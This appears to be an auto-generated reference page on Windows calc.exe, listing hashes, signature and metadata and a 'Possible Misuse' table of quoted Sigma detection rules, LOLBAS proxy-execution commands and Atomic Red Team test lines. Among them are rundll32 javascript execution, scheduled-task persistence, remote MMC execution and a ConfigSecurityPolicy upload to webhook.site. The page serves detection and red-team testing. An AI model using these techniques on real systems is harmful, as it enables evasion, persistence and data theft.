---
title: calc.exe | Windows Calculator
excerpt: What is calc.exe?
---

# calc.exe 

* File Path: `C:\Windows\system32\calc.exe`
* Description: Windows Calculator

## Hashes

Type | Hash
-- | --
MD5 | `5DA8C98136D98DFEC4716EDD79C7145F`
SHA1 | `ED13AF4A0A754B8DAEE4929134D2FF15EBE053CD`
SHA256 | `58189CBD4E6DC0C7D8E66B6A6F75652FC9F4AFC7CE0EBA7D67D8C3FEB0D5381F`
SHA384 | `871A9643E947BEF44AA5E52E828F7245EE427CE14133778048F769FDD04F75119EE5453A90EC581A29B6A0722477B4E2`
SHA512 | `6E2B067760EC178CDCC4DF04C541CE6940FC2A0CDD36F57F4D6332E38119DBC5E24EB67C11D2C8C8FFEED43533C2DD8B642D2C7C997C392928091B5CCCE7582A`
SSDEEP | `384:Otj8FKzuRxmeWCJxhd2WS/YWyiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiLiiiB:QXif4CbPQ7`
IMP | `8EEAA9499666119D13B3F44ECD77A729`
PESHA1 | `68555FB55B4D974628D429EDA7F5E282D647B426`
PE256 | `6C669C3BB2E7F23798AFD237461979E232F08D0B834F8097EE2B84E6D8ED56A7`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\Windows\System32\ADVAPI32.dll |
C:\Windows\system32\calc.exe |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\System32\IMM32.DLL |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\sechost.dll |
C:\Windows\System32\SHELL32.dll |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\System32\win32u.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CALC.EXE
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/76
* VirusTotal Link: https://www.virustotal.com/gui/file/58189cbd4e6dc0c7d8e66b6a6f75652fc9f4afc7ce0eba7d67d8c3feb0d5381f/detection

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\WINDOWS\system32\calc.exe](calc.exe-F88CC05134C555D4E1CD1DEF78162A9A.md) | 38
[C:\WINDOWS\SysWOW64\calc.exe](calc.exe-0F47684C213A9A4E77E9CB5CD3A1C70D.md) | 41
[C:\Windows\SysWOW64\calc.exe](calc.exe-60FF7F830695B46E4E978968D9A995FE.md) | 38
[C:\Windows\SysWOW64\calc.exe](calc.exe-961E093BE1F666FD38602AD90A5F480F.md) | 46

## Possible Misuse

*The following table contains possible examples of `calc.exe` being misused. While `calc.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_calc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_calc.yml) | `description: Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_calc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_calc.yml) | `CommandLine: '*\calc.exe *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_calc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_calc.yml) | `Image: '*\calc.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Explorer.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Explorer.yml) | `- Command: explorer.exe calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Explorer.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Explorer.yml) | `Description: 'Executes calc.exe as a subprocess of explorer.exe.'` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Gpup.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Gpup.yml) | `- Command: Gpup.exe -w whatever -e c:\Windows\System32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvudisp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvudisp.yml) | `- Command: Nvudisp.exe System calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvudisp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvudisp.yml) | `Description: Execute calc.exe as a subprocess.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvudisp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvudisp.yml) | `- Command: Nvudisp.exe CreateShortcut test.lnk,"Test","c:\windows\system32\calc.exe\","","c:\windows\system32\"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvuhda6.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvuhda6.yml) | `- Command: nvuhda6.exe System calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvuhda6.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvuhda6.yml) | `Description: Execute calc.exe as a subprocess.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvuhda6.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvuhda6.yml) | `- Command: nvuhda6.exe CreateShortcut test.lnk,"Test","C:\Windows\System32\calc.exe","","C:\Windows\System32\"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Nvuhda6.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Nvuhda6.yml) | `- Command: nvuhda6.exe KillApp calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Usbinst.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherBinaries/Usbinst.yml) | `Description: Execute calc.exe through DefaultInstall Section Directive in INF file.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `- Command: bash.exe -c calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bash.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml) | `Description: Executes calc.exe from bash.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Diskshadow.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diskshadow.yml) | `- Command: diskshadow> exec calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Explorer.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml) | `- Command: explorer.exe /root,"C:\Windows\System32\calc.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Explorer.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml) | `Description: Execute calc.exe with the parent process spawning from a new instance of explorer.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Description: Command for copying calc.exe to another folder` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Forfiles.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml) | `- Command: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Forfiles.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml) | `Description: Executes calc.exe since there is a match for notepad.exe in the c:\windows\System32 folder.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ftp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml) | `- Command: echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `- Command: HH.exe c:\windows\system32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `Description: Executes calc.exe with HTML Help.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pcalua.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcalua.yml) | `- Command: pcalua.exe -a calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `- Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Rundll32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | `Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Scriptrunner.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml) | `- Command: Scriptrunner.exe -appvscript calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Scriptrunner.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml) | `Description: Executes calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ttdinject.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ttdinject.yml) | `- Command: TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ttdinject.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ttdinject.yml) | `- Command: ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "C:/Windows/System32/calc.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Tttracer.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Tttracer.yml) | `- Command: tttracer.exe C:\windows\system32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `- Command: rundll32.exe advpack.dll,RegisterOCX calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `- Command: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `- Command: rundll32.exe ieadvpack.dll,RegisterOCX calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `- Command: rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pcwutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Pcwutl.yml) | `- Command: rundll32.exe pcwutl.dll,LaunchApplication calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Setupapi.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml) | `- Command: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\calc_exe.inf` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Setupapi.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml) | `- Code: https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Url.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml) | `- Command: rundll32.exe url.dll,FileProtocolHandler calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Zipfldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml) | `- Command: rundll32.exe zipfldr.dll,RouteTheCall calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Manage-bde.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml) | `- Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Sqltoolsps.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml) | `- Command: SQLToolsPS.exe -noprofile -command Start-Process calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Vsjitdebugger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml) | `- Command: Vsjitdebugger.exe calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Vsjitdebugger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml) | `Description: Executes calc.exe as a subprocess of Vsjitdebugger.exe.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Description: Executes calc.exe from wsl.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [problem_report.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md) | e.g. The atomic test executes and `calc.exe` is launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | SW.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", 'C:\\Windows\\System32', null, 0); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | Mshta spawns child process of calc.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1021.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.md) | Upon successful execution, cmd will spawn calc.exe on a remote computer. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1021.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.md) | [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md) | \| input_file \| C# code that launches calc.exe from a hidden cmd.exe Window \| Path \| PathToAtomicsFolder&#92;T1027.004&#92;src&#92;calc.cs\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | \| exe_path \| path to exe to use when creating masquerading files \| path \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | $Action = New-ScheduledTaskAction -Execute "calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1055.012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.md) | \| sponsor_binary_path \| Path of the sponsor binary (executable that will host the binary) \| string \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1106.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.md) | Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1112.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md) | \| new_executable \| New executable to run on startup instead of Windows Defender \| string \| calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md) | calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1140.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1140/T1140.md) | \| executable \| name of executable \| path \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1140.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1140/T1140.md) | \| executable \| name of executable/file to decode \| path \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1202.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md) | Upon execution, calc.exe should open | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1202.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md) | \| payload_path \| Path to payload \| path \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1202.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md) | \| process \| Process to execute \| string \| calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1202.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md) | "This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1202.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.md) | Upon execution calc.exe will be opened | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Upon execution, calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | \| command_to_execute \| A command to execute. \| Path \| %windir%&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | \| powershell_code \| PowerShell code to execute \| string \| Start-Process calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Upon execution calc.exe will open | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.002/T1218.002.md) | Upon execution calc.exe will be launched | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Execute an arbitrary remote HTA. Upon execution calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | windows defender real-time protection to fix it. Upon execution, calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | Upon execution calc.exe will be launched | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md) | \| command_to_execute \| Command for rundll32.exe to execute \| string \| calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.md) | \| target_binary \| Binary To Attach To \| Path \| C:&#92;Windows&#92;System32&#92;calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.013.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md) | Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
